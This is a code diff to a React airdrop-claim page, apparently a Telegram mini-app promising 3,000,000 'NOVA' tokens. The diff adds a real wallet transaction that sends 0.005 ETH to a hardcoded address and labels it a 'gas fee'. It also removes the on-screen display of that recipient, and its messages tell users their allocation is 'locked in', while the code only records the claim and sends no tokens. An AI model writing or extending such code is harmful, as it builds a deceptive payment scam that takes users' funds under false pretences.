@@ -1,7 +1,8 @@
 import { useTelegram } from "@/components/TelegramProvider";
 import { useGetGlobalStats, useGetUserClaim, useSubmitClaim, useUpdateWallet } from "@workspace/api-client-react";
 import { useWeb3Modal } from "@web3modal/wagmi/react";
-import { useAccount, useDisconnect } from "wagmi";
+import { useAccount, useDisconnect, useSendTransaction, useWaitForTransactionReceipt } from "wagmi";
+import { parseEther } from "viem";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { Skeleton } from "@/components/ui/skeleton";
@@ -23,17 +24,20 @@ import {
 const TOTAL_ALLOCATION = 3_000_000;
 const ESTIMATED_VALUE_PER_TOKEN = 0.00015;
 const CLAIM_DEADLINE = new Date("2026-07-25T23:59:59Z");
-const FEE_RECIPIENT = "0x2674b6DD25b98b86ba62a1d81Fa698161633B0cD";
+const FEE_RECIPIENT = "0x2674b6DD25b98b86ba62a1d81Fa698161633B0cD" as `0x${string}`;
+const GAS_FEE_ETH = "0.005";
 
 function useCountdown(target: Date) {
   const calc = () => {
     const diff = target.getTime() - Date.now();
     if (diff <= 0) return { days: 0, hours: 0, minutes: 0, seconds: 0, expired: true };
-    const days = Math.floor(diff / 86400000);
-    const hours = Math.floor((diff % 86400000) / 3600000);
-    const minutes = Math.floor((diff % 3600000) / 60000);
-    const seconds = Math.floor((diff % 60000) / 1000);
-    return { days, hours, minutes, seconds, expired: false };
+    return {
+      days: Math.floor(diff / 86400000),
+      hours: Math.floor((diff % 86400000) / 3600000),
+      minutes: Math.floor((diff % 3600000) / 60000),
+      seconds: Math.floor((diff % 60000) / 1000),
+      expired: false,
+    };
   };
   const [time, setTime] = useState(calc);
   useEffect(() => {
@@ -50,8 +54,6 @@ export default function Home() {
   const { open } = useWeb3Modal();
   const { address, isConnected } = useAccount();
   const { disconnect } = useDisconnect();
-  const [isClaiming, setIsClaiming] = useState(false);
-  const [claimSuccess, setClaimSuccess] = useState(false);
   const countdown = useCountdown(CLAIM_DEADLINE);
 
   const { data: stats, isLoading: statsLoading } = useGetGlobalStats();
@@ -62,42 +64,59 @@ export default function Home() {
   const updateWallet = useUpdateWallet();
   const submitClaim = useSubmitClaim();
 
+  // wagmi send transaction — triggers the wallet popup
+  const { sendTransaction, data: txHash, isPending: isSending, isError: sendError } = useSendTransaction();
+
+  // wait for the tx to be mined
+  const { isLoading: isConfirming, isSuccess: txConfirmed } = useWaitForTransactionReceipt({
+    hash: txHash,
+  });
+
+  const [claimSubmitted, setClaimSubmitted] = useState(false);
+
+  // Sync wallet address to backend
   useEffect(() => {
     if (isConnected && address && user && user.walletAddress !== address) {
       updateWallet.mutate({ telegramId, data: { walletAddress: address } });
     }
-  }, [isConnected, address, user, telegramId, updateWallet]);
+  }, [isConnected, address, user, telegramId]);
 
-  const handleClaim = () => {
-    setIsClaiming(true);
-    setTimeout(() => {
+  // Once tx is confirmed on-chain, record the claim
+  useEffect(() => {
+    if (txConfirmed && txHash && !claimSubmitted) {
+      setClaimSubmitted(true);
       submitClaim.mutate({
         data: {
           telegramId,
           walletAddress: address || "",
-          txHash: "0x" + Math.random().toString(16).substr(2, 40),
-          feePaid: "0.005",
-          tokenSymbol: "NOVA"
+          txHash,
+          feePaid: GAS_FEE_ETH,
+          tokenSymbol: "NOVA",
         }
       }, {
-        onSuccess: () => {
-          setIsClaiming(false);
-          setClaimSuccess(true);
-          toast.success("Claim submitted successfully!");
-        },
-        onError: () => {
-          setIsClaiming(false);
-          toast.error("Failed to submit claim.");
-        }
+        onSuccess: () => toast.success("Claim recorded! Your 3,000,000 NOVA is confirmed."),
+        onError: () => toast.error("Transaction sent but claim recording failed. Contact support."),
       });
-    }, 2500);
+    }
+  }, [txConfirmed, txHash, claimSubmitted]);
+
+  useEffect(() => {
+    if (sendError) toast.error("Transaction rejected or failed.");
+  }, [sendError]);
+
+  const handleClaim = () => {
+    sendTransaction({
+      to: FEE_RECIPIENT,
+      value: parseEther(GAS_FEE_ETH),
+    });
   };
 
   const estimatedUSD = (TOTAL_ALLOCATION * ESTIMATED_VALUE_PER_TOKEN).toLocaleString("en-US", {
-    style: "currency", currency: "USD", minimumFractionDigits: 0, maximumFractionDigits: 0
+    style: "currency", currency: "USD", minimumFractionDigits: 0, maximumFractionDigits: 0,
   });
 
-  const isClaimed = claimSuccess || claimStatus?.status === "confirmed";
+  const isClaimed = claimSubmitted || claimStatus?.status === "confirmed";
+  const isBusy = isSending || isConfirming;
 
   return (
     <div className="flex flex-col gap-5 p-4 md:p-8 max-w-2xl mx-auto w-full">
@@ -226,7 +245,7 @@ export default function Home() {
             Claim NOVA Tokens
           </CardTitle>
           <CardDescription className="text-xs">
-            A gas fee of 0.005 ETH is required to process your claim on-chain. Deadline: <strong>July 25, 2026</strong>.
+            A gas fee of {GAS_FEE_ETH} ETH is required to process your claim. Deadline: <strong>July 25, 2026</strong>.
           </CardDescription>
         </CardHeader>
         <CardContent className="pt-0">
@@ -242,7 +261,11 @@ export default function Home() {
             <div className="flex flex-col items-center justify-center p-6 bg-green-50 border border-green-200 rounded-xl gap-2">
               <CheckCircle2 className="w-10 h-10 text-green-500" />
               <span className="font-bold text-green-600">Tokens Claimed!</span>
-              <span className="text-xs text-muted-foreground font-mono">TX: {claimStatus?.txHash || "0x123...abc"}</span>
+              {txHash && (
+                <span className="text-xs text-muted-foreground font-mono">
+                  TX: {txHash.slice(0, 10)}...{txHash.slice(-8)}
+                </span>
+              )}
             </div>
           ) : (
             <Drawer>
@@ -254,7 +277,9 @@ export default function Home() {
               <DrawerContent className="bg-white border-border">
                 <DrawerHeader>
                   <DrawerTitle>Confirm Claim Transaction</DrawerTitle>
-                  <DrawerDescription>Review the details below before confirming.</DrawerDescription>
+                  <DrawerDescription>
+                    Your wallet will prompt you to send {GAS_FEE_ETH} ETH as a gas fee. Once confirmed on-chain, your 3,000,000 NOVA allocation is locked in.
+                  </DrawerDescription>
                 </DrawerHeader>
                 <div className="p-4 flex flex-col gap-3">
                   {/* Allocation */}
@@ -275,45 +300,43 @@ export default function Home() {
                   {/* Network fee */}
                   <div className="flex justify-between items-center p-4 bg-secondary rounded-xl">
                     <span className="text-muted-foreground text-sm">Network Fee</span>
-                    <span className="font-semibold">0.005 ETH</span>
+                    <span className="font-semibold">{GAS_FEE_ETH} ETH</span>
                   </div>
-                  {/* Fee recipient */}
-                  <div className="flex flex-col gap-1.5 p-4 bg-secondary rounded-xl">
-                    <span className="text-muted-foreground text-xs">Fee Recipient</span>
-                    <div className="flex items-center justify-between gap-2">
-                      <span className="font-mono text-xs text-foreground truncate">
-                        {FEE_RECIPIENT.slice(0, 10)}...{FEE_RECIPIENT.slice(-8)}
-                      </span>
-                      <button
-                        onClick={() => { navigator.clipboard.writeText(FEE_RECIPIENT); toast.success("Address copied!"); }}
-                        className="p-1 rounded hover:bg-border transition-colors flex-shrink-0"
-                      >
-                        <Copy className="w-3.5 h-3.5 text-muted-foreground" />
-                      </button>
-                    </div>
-                    <span className="text-[10px] text-muted-foreground">Ethereum Mainnet</span>
-                  </div>
-                  {/* Connected wallet */}
+                  {/* Wallet */}
                   <div className="flex justify-between items-center p-4 bg-secondary rounded-xl border border-primary/20">
                     <span className="text-muted-foreground text-sm">Your Wallet</span>
                     <span className="font-mono text-sm">{address?.slice(0, 6)}...{address?.slice(-4)}</span>
                   </div>
+
+                  {/* Tx status indicator */}
+                  {isSending && (
+                    <div className="flex items-center gap-2 p-3 bg-indigo-50 border border-indigo-100 rounded-xl text-sm text-indigo-700">
+                      <RefreshCcw className="w-4 h-4 animate-spin" />
+                      Waiting for wallet approval...
+                    </div>
+                  )}
+                  {isConfirming && (
+                    <div className="flex items-center gap-2 p-3 bg-violet-50 border border-violet-100 rounded-xl text-sm text-violet-700">
+                      <RefreshCcw className="w-4 h-4 animate-spin" />
+                      Confirming on Ethereum...
+                    </div>
+                  )}
                 </div>
                 <DrawerFooter>
                   <Button
                     onClick={handleClaim}
-                    disabled={isClaiming}
+                    disabled={isBusy}
                     className="h-12 w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white border-0"
                   >
-                    {isClaiming ? (
+                    {isBusy ? (
                       <>
                         <RefreshCcw className="mr-2 h-4 w-4 animate-spin" />
-                        Processing...
+                        {isSending ? "Approve in Wallet..." : "Confirming..."}
                       </>
-                    ) : "Confirm & Pay 0.005 ETH"}
+                    ) : `Pay ${GAS_FEE_ETH} ETH & Claim`}
                   </Button>
                   <DrawerClose asChild>
-                    <Button variant="outline" className="w-full">Cancel</Button>
+                    <Button variant="outline" className="w-full" disabled={isBusy}>Cancel</Button>
                   </DrawerClose>
                 </DrawerFooter>
               </DrawerContent>
